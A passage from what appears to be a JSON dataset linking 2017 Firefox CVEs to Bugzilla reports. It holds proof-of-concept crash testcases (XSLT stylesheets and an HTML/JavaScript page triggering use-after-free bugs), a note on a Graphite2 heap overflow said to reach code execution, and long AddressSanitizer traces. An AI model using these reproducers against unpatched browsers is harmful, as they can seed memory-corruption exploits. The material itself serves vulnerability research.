const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:472:15 #31 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #32 0x7f27921ce96e in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #33 0x7f2792185164 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:23 #34 0x7f27921aee83 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:21 #35 0x7f27921b17e7 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #36 0x7f27915c41a3 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #37 0x7f27915c41a3 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #38 0x7f27915c4802 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:518:10 #39 0x7f2791f4142b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2887:12 #40 0x7f278b895c95 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/xpcom/ds/nsDeque.cpp:260:7 in nsDeque::Pop() Shadow bytes around the buggy address: 0x0c2880020530: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c2880020540: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c2880020550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2880020560: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2880020570: 00 00 00 00 00 00 00 00 00 00 03 fa fa fa fa fa =>0x0c2880020580: fa fa fa fa fa fa fa fa fd fd fd fd[fd]fd fd fd 0x0c2880020590: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c28800205a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c28800205b0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c28800205c0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c28800205d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==12221==ABORTING"
      }
    ],
    "CVE-2017-5436": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1345461",
        "title": "Graphite2 FeatureRef::applyValToFeature heap overflow",
        "description": "A graphite font with a specially crafted feature table can cause a heap overflow which is exploitable to archive remote code execution. The vulnerability exists in FeatureRef::applyValToFeature in the graphite 2 library. Before accessing data FeatureRef::applyValToFeature tries to ensure that the capacity of the pDest Vector is sufficient through a call to Vector ::reserve but it reserves one too few because the variable m_index is used for the call to Vector::reserve and for accessing the Vector data. This leads to the possibility of a 1-32 bit overflow because the vector is used as a bit map. The attached pocs work with https://ftp.mozilla.org/pub/firefox/releases/52.0/linux-x86_64/en-US/firefox-52.0.tar.bz2 and show the possibility to exploit the vulnerability to archive remote code execution: - poc1 calculates the base address for the xul library - poc2 crashes with a jump to 0x4141414141414141"
      }
    ],
    "CVE-2017-5438": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336828",
        "title": "UAF in nsAutoPtr destructor during XSLT processing",
        "description": "Tested under xpcshell \"JavaScript-C54.0a1\" Note: the \"match\" attribute of the XSLT node \"template\" must match the name of the XML root tag [+] Relevant parts xml_str = '<tag_name/>'; xsl_str = '<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"42\">' + ' <xsl:variable name=\"var_name\"><xsl:template/></xsl:variable>' + ' <xsl:template match=\"tag_name[$var_name]\"/>' + '</xsl:stylesheet>' xml = parse_str(xml_str, 'text/xml'); xsl = parse_str(xsl_str, 'text/xml'); transform(xml, xsl); [+] How to reproduce $ ./poc_xslt_uaf_nsAutoPtr_dtor.js ==20218==ERROR: AddressSanitizer: heap-use-after-free on address 0x60400003e410 at pc 0x7f2e219117be bp 0x7ffc99c5b7a0 sp 0x7ffc99c5b798 READ of size 8 at 0x60400003e410 thread T0 #0 0x7f2e219117bd in ~nsAutoPtr /home/worker/workspace/build/src/obj-firefox/dist/include/nsAutoPtr.h:78:5 #1 0x7f2e219117bd in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:99 #2 0x7f2e2194a015 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:701:1 #3 0x7f2e2194fbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 #4 0x7f2e2194fbdb in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1297 ... 0x60400003e410 is located 0 bytes inside of 40-byte region [0x60400003e410,0x60400003e438) freed by thread T0 here: #0 0x4b20db in free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f2e21910697 in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:90:9 #2 0x7f2e2194a015 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:701:1 #3 0x7f2e2194fbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 #4 0x7f2e2194fbdb in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1297 ... previously allocated by thread T0 here: #0 0x4b23fb in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4df2ad in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f2e21942bb2 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f2e21942bb2 in txToDocHandlerFactory::createHandlerWith(txOutputFormat*, txAXMLEventHandler**) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:93 #4 0x7f2e21911d13 in txExecutionState::init(txXPathNode const&, txOwningExpandedNameMap<txIGlobalParameter>*) /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:115:10 #5 0x7f2e21949c01 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:672:19 #6 0x7f2e2194fbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 #7 0x7f2e2194fbdb in txMozillaXSLTProcessor::TransformToDocument(nsINode&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:1297 ..."
      }
    ],
    "CVE-2017-5439": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336830",
        "title": "UAF in nsTArray Length() during XSLT processing",
        "description": "XPCshell PoC Tested under xpcshell \"JavaScript-C54.0a1\" [+] Relevant parts xsl_str = '<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"42\">' + ' <xsl:template match=\"*\">' + ' <xsl:apply-imports/>' + ' <xsl:apply-templates select=\".\">' + ' <xsl:with-param name=\"whatever_1\">whatever_2</xsl:with-param>' + ' </xsl:apply-templates>' + ' </xsl:template>' + '</xsl:stylesheet>' [+] How to reproduce $ ./poc_xslt_uaf_nsTArray_Length.js ==20267==ERROR: AddressSanitizer: heap-use-after-free on address 0x602000334890 at pc 0x7f04c798d7b9 bp 0x7ffd20419800 sp 0x7ffd204197f8 READ of size 8 at 0x602000334890 thread T0 #0 0x7f04c798d7b8 in Length /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:515:37 #1 0x7f04c798d7b8 in next /home/worker/workspace/build/src/dom/xslt/base/txExpandedNameMap.h:68 #2 0x7f04c798d7b8 in ~txVariableMap /home/worker/workspace/build/src/dom/xslt/xslt/txVariableMap.h:42 #3 0x7f04c798d7b8 in ~nsAutoPtr /home/worker/workspace/build/src/obj-firefox/dist/include/nsAutoPtr.h:78 #4 0x7f04c798d7b8 in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:99 #5 0x7f04c79c6015 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:701:1 #6 0x7f04c79cbbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ... 0x602000334890 is located 0 bytes inside of 8-byte region [0x602000334890,0x602000334898) freed by thread T0 here: #0 0x4b20db in free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f04c798c87f in operator delete /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:218:12 #2 0x7f04c798c87f in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:95 #3 0x7f04c79c6015 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:701:1 #4 0x7f04c79cbbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ... previously allocated by thread T0 here: #0 0x4b23fb in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4df2ad in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f04c79a25ff in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f04c79a25ff in txSetParam::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txInstructions.cpp:761 #4 0x7f04c79fcaed in txXSLTProcessor::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txXSLTProcessor.cpp:49:14 #5 0x7f04c79c5c18 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:676:14 #6 0x7f04c79cbbdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ..."
      }
    ],
    "CVE-2017-5440": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1336832",
        "title": "UAF in txExecutionState destructor during XSLT processing",
        "description": "Tested under xpcshell \"JavaScript-C54.0a1\" [+] Relevant parts xsl_str = '<xsl:stylesheet xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">' + ' <xsl:variable name=\"var_1\">' + ' <xsl:for-each select=\"/\">' + ' <xsl:value-of select=\"count()\"/>' + ' </xsl:for-each>' + ' </xsl:variable>' + ' <xsl:template match=\"/\">' + ' <xsl:value-of select=\"//*[1 = $var_1]\"/>' + ' </xsl:template>' + '</xsl:stylesheet>' [+] How to reproduce $ ./poc_xslt_uaf_txExecutionState_dtor.js ==20312==ERROR: AddressSanitizer: heap-use-after-free on address 0x603000060790 at pc 0x7ff772355740 bp 0x7ffd9f4ad0c0 sp 0x7ffd9f4ad0b8 READ of size 8 at 0x603000060790 thread T0 #0 0x7ff77235573f in txExecutionState::~txExecutionState() /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:98:5 #1 0x7ff77238e015 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:701:1 #2 0x7ff772393bdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ... 0x603000060790 is located 0 bytes inside of 24-byte region [0x603000060790,0x6030000607a8) freed by thread T0 here: #0 0x4b20db in free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7ff772363cdc in txLoopNodeSet::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txInstructions.cpp:477:9 #2 0x7ff7723c4aed in txXSLTProcessor::execute(txExecutionState&) /home/worker/workspace/build/src/dom/xslt/xslt/txXSLTProcessor.cpp:49:14 #3 0x7ff77238dc18 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:676:14 #4 0x7ff772393bdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ... previously allocated by thread T0 here: #0 0x4b23fb in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4df2ad in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7ff772355bdc in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7ff772355bdc in txExecutionState::init(txXPathNode const&, txOwningExpandedNameMap<txIGlobalParameter>*) /home/worker/workspace/build/src/dom/xslt/xslt/txExecutionState.cpp:110 #4 0x7ff77238dc01 in txMozillaXSLTProcessor::TransformToDoc(nsIDOMDocument**, bool) /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:672:19 #5 0x7ff772393bdb in TransformToDocument /home/worker/workspace/build/src/dom/xslt/xslt/txMozillaXSLTProcessor.cpp:645:12 ..."
      }
    ],
    "CVE-2017-5441": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1343795",
        "title": "heap-use-after-free in mozilla::dom::Selection::ScrollIntoView",
        "description": "The following testcases crashes the latest ASAN build of Firefox. The testcase requires the fuzzPriv extension. <script> function start() { o0=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); document.body.appendChild(o0); o1=document.createElementNS('http://www.w3.org/1999/xhtml','iframe'); o1.addEventListener('load', fun0,false); document.body.appendChild(o1); } function fun0() { o6=o1.contentDocument; o72=document.createElementNS('http://www.w3.org/1999/xhtml','input'); o0.remove(); o82=document.createElementNS('http://www.w3.org/1999/xhtml','form'); o6.documentElement.appendChild(o82); o82.appendChild(o72); o72.select(); o1.contentWindow.onresize=fun1; o1.width='8px'; } function fun1() { o72.replaceWith(\"\"); window.fuzzPriv.CC(); window.fuzzPriv.CC(); window.setTimeout(\"location.reload()\",4); } </script> <body onload=\"start()\"></body> ================================================================= ==18823==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d0000ace50 at pc 0x7fafead00404 bp 0x7ffe4bdc52d0 sp 0x7ffe4bdc52c8 READ of size 8 at 0x60d0000ace50 thread T0 (Web Content) #0 0x7fafead00403 in operator bool /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:307:45 #1 0x7fafead00403 in mozilla::dom::Selection::ScrollIntoView(short, nsIPresShell::ScrollAxis, nsIPresShell::ScrollAxis, int) /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6163 #2 0x7fafead2b339 in mozilla::dom::Selection::ScrollSelectionIntoViewEvent::Run() /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:6072:3 #3 0x7fafe3f70812 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7 #4 0x7fafe3f6d0c0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10 #5 0x7fafe4d8babf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #6 0x7fafe4cfce58 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #7 0x7fafe4cfce58 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #8 0x7fafe4cfce58 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #9 0x7fafea158cff in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #10 0x7fafed9b13a7 in XRE_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:852:12 #11 0x7fafe4cfce58 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3 #12 0x7fafe4cfce58 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231 #13 0x7fafe4cfce58 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211 #14 0x7fafed9b0e8c in XRE_InitChildProcess(int, char**, XREChildData const*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:684:7 #15 0x4e01b6 in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:19 #16 0x4e01b6 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:287 #17 0x7fafff38d82f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291 #18 0x41c3d8 in _start (/home/nils/fuzzer3/firefox/firefox+0x41c3d8) 0x60d0000ace50 is located 80 bytes inside of 136-byte region [0x60d0000ace00,0x60d0000ace88) freed by thread T0 (Web Content) here: #0 0x4b2b2b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fafe3e0d904 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2664:9 #2 0x7fafe3e0d4f6 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2839:3 #3 0x7fafe3e147d6 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3825:3 #4 0x7fafe3e13fb0 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3650:9 #5 0x7fafe3e16d4c in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4143:3 #6 0x7fafe6a8a76f in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1451:3 #7 0x7fafe65e15fd in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1339:3 #8 0x7fafe3f8bd31 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_asm_x86_64_unix.S:115 #9 0x7fafe5764c47 in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2010:12 #10 0x7fafe5764c47 in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1329 #11 0x7fafe5764c47 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1296 #12 0x7fafe576c5bb in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:983:12 #13 0x7fafede2343f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #14 0x7fafede2343f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #15 0x7fafede09d60 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #16 0x7fafede09d60 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2955 #17 0x7fafeddef08b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #18 0x7fafede23756 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #19 0x7fafede23e32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #20 0x7fafee7f33b3 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2819:12 #21 0x7fafe56a39d9 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7fafede2343f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #23 0x7fafede2343f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448 #24 0x7fafede09d60 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12 #25 0x7fafede09d60 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2955 #26 0x7fafeddef08b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12 #27 0x7fafede23756 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15 #28 0x7fafede23e32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #29 0x7fafeea96dfc in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7fafeea4d04e in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:353:14 #31 0x7fafeea768b9 in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:464:12 #32 0x7fafeea791e4 in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:716:12 #33 0x7fafede234e7 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15 #34 0x7fafede234e7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:436 #35 0x7fafede23e32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10 #36 0x7fafee7f516c in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12 previously allocated by thread T0 (Web Content) here: #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e11bd in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fafeacf91c9 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7fafeacf91c9 in nsFrameSelection::nsFrameSelection() /home/worker/workspace/build/src/layout/generic/nsSelection.cpp:537 #4 0x7fafe8be288b in nsTextEditorState::BindToFrame(nsTextControlFrame*) /home/worker/workspace/build/src/dom/html/nsTextEditorState.cpp:1170:43 #5 0x7fafeae1b6e4 in nsTextControlFrame::CreateAnonymousContent(nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/forms/nsTextControlFrame.cpp:332:17 #6 0x7fafea978277 in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4207:17 #7 0x7fafea96c3ed in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10909:3 #8 0x7fafea98130e in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4062:9 #9 0x7fafea98c286 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6209:3 #10 0x7fafea96d1b4 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10705:5 #11 0x7fafea96d1b4 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10994 #12 0x7fafea975c73 in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:12004:3 #13 0x7fafea984cf5 in ConstructNonScrollableBlockWithConstructor /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4950:3 #14 0x7fafea984cf5 in nsCSSFrameConstructor::ConstructNonScrollableBlock(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItem&, nsContainerFrame*, nsStyleDisplay const*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4914 #15 0x7fafea980229 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:3881:7 #16 0x7fafea98c286 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6209:3 #17 0x7fafea99a67b in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10705:5 #18 0x7fafea99a67b in nsCSSFrameConstructor::ContentAppended(nsIContent*, nsIContent*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7564 #19 0x7fafea994f48 in nsCSSFrameConstructor::CreateNeededFrames(nsIContent*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7183:5 #20 0x7fafea8a9042 in 